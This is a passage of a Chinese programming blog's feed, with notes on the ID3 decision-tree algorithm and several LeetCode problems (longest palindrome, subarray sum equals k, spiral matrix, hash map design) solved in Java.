title="递归构建决策树"></a>递归构建决策树</h2><p>一般是使用递归的方法，以特征为递归的变量，递归构建决策树</p><p>递归结束的条件是：<strong>程序遍历完所有划分数据集的属性</strong>，或者<strong>每个分支下的所有实例都具有相同的分类</strong>。如果所有实例具有相同的分类，则得到一个叶子节点护着终止块。任何到达叶子节点的数据必然属于叶子节点的分类</p><h1 id="ID3算法用于鸢尾花-Iris-数据分类"><a href="#ID3算法用于鸢尾花-Iris-数据分类" class="headerlink" title="ID3算法用于鸢尾花(Iris)数据分类"></a>ID3算法用于鸢尾花(Iris)数据分类</h1><p>主要函数</p><table><thead><tr><th>函数名</th><th>参数</th><th>返回值</th><th align="center">功能</th><th>备注</th></tr></thead><tbody><tr><td>calc_gain(dataSet)</td><td>dataSet:当前需要计算香农熵的集合</td><td>gain:香农熵</td><td align="center">返回该数据集的无序程度描述</td><td></td></tr><tr><td>splitDataSet(dataSet, offset, value)</td><td>dataSet;需要分割的数据集<br>offest:需要分割的值在数据集每一行的偏移<br>value:需要分割offest的具体值</td><td>retDataSet:返回分割好的数据集</td><td align="center">返回分割以及去掉dataSet的offset中为value值的行</td><td></td></tr><tr><td>chose_best_gain(dataSet)</td><td>dataSet:需要计算的数据集</td><td>离散的：<br>bestFeature<br>非离散:<br>bestFeature,bestSeriesMid</td><td align="center">返回以某一特征分类后香农熵最好也就是分类效果最好的特征下标，如果是连续的返回特征，如果为非连续则需要返回特征下标以及均值</td><td></td></tr><tr><td>calcInfoGainForSeries(dataSet, i, baseEntropy)</td><td>dataSet:需要计算的数据集<br>offset:偏移量，也就是下标<br>baseEntropy:chose_base_gain方法传进来的当前的香农熵</td><td>maxInfoGain为计算完成的香农熵；bestMid为分界点</td><td align="center">返回连续的数据集合中，以某一分界点计算香农熵，并且以某一分界点为分类</td><td></td></tr><tr><td>createTree(dataSet, labels)</td><td>dataSet:需要计算的数据集合<br>labels:特征的具体标签值</td><td>myTree递归构建完成的具体树</td><td align="center">通过递归，每次选中效果最好的值进行构建树</td><td></td></tr><tr><td></td><td></td><td></td><td align="center"></td><td></td></tr><tr><td></td><td></td><td></td><td align="center"></td><td></td></tr><tr><td></td><td></td><td></td><td align="center"></td><td></td></tr><tr><td></td><td></td><td></td><td align="center"></td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode629-K个逆序对数组</title>
      <link href="/2021/11/11/LeetCode/LeetCode629-K%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/"/>
      <url>/2021/11/11/LeetCode/LeetCode629-K%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/11/11/LeetCode/LeetCode629-K%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/image-20211111090532400.png" class="lazyload" data-srcset="/2021/11/11/LeetCode/LeetCode629-K%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/image-20211111090532400.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211111090532400"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode5-最长回文串</title>
      <link href="/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/"/>
      <url>/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<img src="/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/image-20211105145042430.png" class="lazyload" data-srcset="/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/image-20211105145042430.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211105145042430" style="zoom:50%;"><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>动态规划最主要的是找出状态转移方程，通过小问题循环解决大问题，对于回文串这题目，如果<code>str[l]==str[r]&amp;&amp;r-l&gt;3</code>则其是否为回文串可由<code>str[l+1]==str[r-1]</code>决定，</p><p><code>boolean[][] dp</code>辅助矩阵行和列分别代表left以及right，图为<code>cbbd</code>输入字符串的辅助数组</p><img src="/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/image-20211105145919373.png" class="lazyload" data-srcset="/2021/11/05/LeetCode/LeetCode5-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2/image-20211105145919373.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211105145919373" style="zoom:50%;"><p>先填充对角线，然后按列进行填充，即是将行作为循环变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> bengin=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="comment">//使用动态规划</span></span><br><span class="line">        <span class="comment">//s[i]==s[j]=》dp[i][j]=dp[i-1][j-1]&amp;&amp;</span></span><br><span class="line">        <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[len][len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i][i]=<span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span>[] chars=s.toCharArray();</span><br><span class="line">        <span class="comment">//行表示左 列表示右 按列进行填充 将行作为循环变量，并且只填充上半部分即是j&lt;i 就是行小于列</span></span><br><span class="line">        <span class="comment">//如果为ture则代表为回文串，i-j+1代表所含字符串的个数，begin则是为起始位置</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;<span class="comment">//列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;<span class="comment">//行</span></span><br><span class="line">                <span class="keyword">if</span>(chars[i]==chars[j])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i-j&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                        dp[j][i]=<span class="keyword">true</span>;</span><br><span class="line">                        <span class="keyword">if</span>(i-j+<span class="number">1</span>&gt;max)&#123;</span><br><span class="line">                            bengin=j;</span><br><span class="line">                            max=i-j+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dp[j][i]=dp[j+<span class="number">1</span>][i-<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span>(dp[j][i])&#123;</span><br><span class="line">                                <span class="keyword">if</span>(i-j+<span class="number">1</span>&gt;max)&#123;</span><br><span class="line">                                bengin=j;</span><br><span class="line">                                max=i-j+<span class="number">1</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[j][i]=<span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(bengin,bengin+max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里卡在了max代表的是字符串的长度，并不是右边界，所以子串应该为(begin,begin+max)，该动态规划的是时间复杂度为O(n^2);</p><h2 id="马拉车算法"><a href="#马拉车算法" class="headerlink" title="马拉车算法"></a>马拉车算法</h2>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-码点和代码单元</title>
      <link href="/2021/11/04/Java/Java-%E7%A0%81%E7%82%B9%E5%92%8C%E4%BB%A3%E7%A0%81%E5%8D%95%E5%85%83/"/>
      <url>/2021/11/04/Java/Java-%E7%A0%81%E7%82%B9%E5%92%8C%E4%BB%A3%E7%A0%81%E5%8D%95%E5%85%83/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode42-407-接雨水</title>
      <link href="/2021/11/03/LeetCode/LeetCode42-407-%E6%8E%A5%E9%9B%A8%E6%B0%B4/"/>
      <url>/2021/11/03/LeetCode/LeetCode42-407-%E6%8E%A5%E9%9B%A8%E6%B0%B4/</url>
      
        <content type="html"><![CDATA[<img src="/2021/11/03/LeetCode/LeetCode42-407-%E6%8E%A5%E9%9B%A8%E6%B0%B4/image-20211103115813746.png" class="lazyload" data-srcset="/2021/11/03/LeetCode/LeetCode42-407-%E6%8E%A5%E9%9B%A8%E6%B0%B4/image-20211103115813746.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211103115813746" style="zoom:80%;"><h1 id="LeetCode42"><a href="#LeetCode42" class="headerlink" title="LeetCode42"></a>LeetCode42</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode560-和为k的子数组</title>
      <link href="/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/"/>
      <url>/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<img src="/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/image-20211102192047070.png" class="lazyload" data-srcset="/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/image-20211102192047070.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211102192047070" style="zoom:50%;"><p>返回和为k的子数组</p><h1 id="暴力遍历O-n-2"><a href="#暴力遍历O-n-2" class="headerlink" title="暴力遍历O(n^2)"></a>暴力遍历O(n^2)</h1><p>将每次遍历的元素作为子数组的end元素，然后不断自减下标去判断子串和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> cur_sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> start=i;start&gt;=<span class="number">0</span>;start--)&#123;</span><br><span class="line">                cur_sum+=nums[start];</span><br><span class="line">                <span class="keyword">if</span>(cur_sum==k)&#123;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用前缀和和Hash表"><a href="#使用前缀和和Hash表" class="headerlink" title="使用前缀和和Hash表"></a>使用前缀和和Hash表</h1><p>使用<code>pre</code>表示前缀和，<code>pre[i]: [0,1···i]</code>的前缀和，而<code>pre[j]</code>同理，可得<code>pre[i]-pre[j-1]=k</code>即为<code>下标[j···i]</code>数组之和</p><p>在每一轮计算pre时，可以使用<code>value=pre-k</code>得到，找出之前<code>pre[j-1]</code>也就是value值，就能得到之前有多少个以i为结尾连续的数组和为k</p><img src="/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/1.jpg" class="lazyload" data-srcset="/2021/11/02/LeetCode/LeetCode560-%E5%92%8C%E4%B8%BAk%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1" style="zoom: 25%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>, pre = <span class="number">0</span>;</span><br><span class="line">        HashMap &lt; Integer, Integer &gt; mp = <span class="keyword">new</span> HashMap &lt; &gt; ();</span><br><span class="line">        mp.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            pre += nums[i];</span><br><span class="line">            <span class="keyword">if</span> (mp.containsKey(pre - k)) &#123;</span><br><span class="line">                count += mp.get(pre - k);</span><br><span class="line">            &#125;</span><br><span class="line">            mp.put(pre, mp.getOrDefault(pre, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>需要注意一开始需要将0,1put进去，因为pre-k减完为0则代表刚好前缀和满足</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode591-螺旋矩阵</title>
      <link href="/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/"/>
      <url>/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><hr><img src="/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/image-20211101183407916.png" class="lazyload" data-srcset="/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/image-20211101183407916.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211101183407916" style="zoom:50%;"><h2 id="题解一"><a href="#题解一" class="headerlink" title="题解一"></a>题解一</h2><p>对于此题有四个方向轮流转，右下左上···四个方向轮流循环，而在每个方向中，比如向左，总是列+1，所以可以用一个二维矩阵表示方向</p><p><code> int[][] direct=new int[][]&#123;&#123;0, 1&#125;, &#123;1, 0&#125;, &#123;0, -1&#125;, &#123;-1, 0&#125;&#125;; // 右下左上</code>,四行表示四个方向，而第一列、第二列分别代表行或者列需要加的数</p><p>然后使用<code>contro_direct%4</code>循环去选择方向</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] generateMatrix(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span>[][] res=<span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            res[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//一共四个方向 右下左右不断循环</span></span><br><span class="line">        <span class="keyword">int</span>[][] direct=<span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;; <span class="comment">// 右下左上</span></span><br><span class="line">        <span class="keyword">int</span> cur_num=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> last=n*n;</span><br><span class="line">        <span class="keyword">int</span> row=<span class="number">0</span>,col=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> contro_direct=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur_num&lt;=last)&#123;</span><br><span class="line">            <span class="comment">// System.out.println(cur_num);</span></span><br><span class="line">            res[row][col]=cur_num++;</span><br><span class="line">            <span class="keyword">int</span> nextrow=row+direct[contro_direct][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> nextcol=col+direct[contro_direct][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(nextrow&gt;n-<span class="number">1</span>||nextcol&gt;n-<span class="number">1</span>||nextrow&lt;<span class="number">0</span>||nextcol&lt;<span class="number">0</span>||res[nextrow][nextcol]!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//换方向</span></span><br><span class="line">                contro_direct=(++contro_direct)%<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            row=row+direct[contro_direct][<span class="number">0</span>];</span><br><span class="line">            col=col+direct[contro_direct][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题解二按层模拟"><a href="#题解二按层模拟" class="headerlink" title="题解二按层模拟"></a>题解二按层模拟</h2><p>可以将矩阵看成若干层，首先填入矩阵最外层的元素，其次填入矩阵次外层的元素，直到填入矩阵最内层的元素。</p><p>定义矩阵的第 k 层是到最近边界距离为 kk 的所有顶点。例如，下图矩阵最外层元素都是第 1 层，次外层元素都是第 2 层，最内层元素都是第 3层。</p><p>以下是官方题解</p><img src="/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/image-20211101185346812.png" class="lazyload" data-srcset="/2021/11/01/LeetCode/LeetCode591-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/image-20211101185346812.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211101185346812" style="zoom:67%;"><p>对于每层，从左上方开始以顺时针的顺序填入所有元素。假设当前层的左上角位于 top、left，右下角位于bottom, right，按照如下顺序填入当前层的元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] generateMatrix(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>, top = <span class="number">0</span>, bottom = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; top &lt;= bottom) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> column = left; column &lt;= right; column++) &#123;</span><br><span class="line">                matrix[top][column] = num;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> row = top + <span class="number">1</span>; row &lt;= bottom; row++) &#123;</span><br><span class="line">                matrix[row][right] = num;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right &amp;&amp; top &lt; bottom) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> column = right - <span class="number">1</span>; column &gt; left; column--) &#123;</span><br><span class="line">                    matrix[bottom][column] = num;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> row = bottom; row &gt; top; row--) &#123;</span><br><span class="line">                    matrix[row][left] = num;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">            top++;</span><br><span class="line">            bottom--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：LeetCode-Solution</span><br><span class="line">链接：https:<span class="comment">//leetcode-cn.com/problems/spiral-matrix-ii/solution/luo-xuan-ju-zhen-ii-by-leetcode-solution-f7fp/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode706-设计hash映射</title>
      <link href="/2021/11/01/LeetCode/Leetcode706-%E8%AE%BE%E8%AE%A1hash%E6%98%A0%E5%B0%84/"/>
      <url>/2021/11/01/LeetCode/Leetcode706-%E8%AE%BE%E8%AE%A1hash%E6%98%A0%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="1-暴力数组"><a href="#1-暴力数组" class="headerlink" title="1.暴力数组"></a>1.暴力数组</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashMap</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用二维数组维护hashi表</span></span><br><span class="line">    <span class="keyword">int</span>[] nums=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            nums[i]=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        nums[key%<span class="number">1000001</span>]=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span 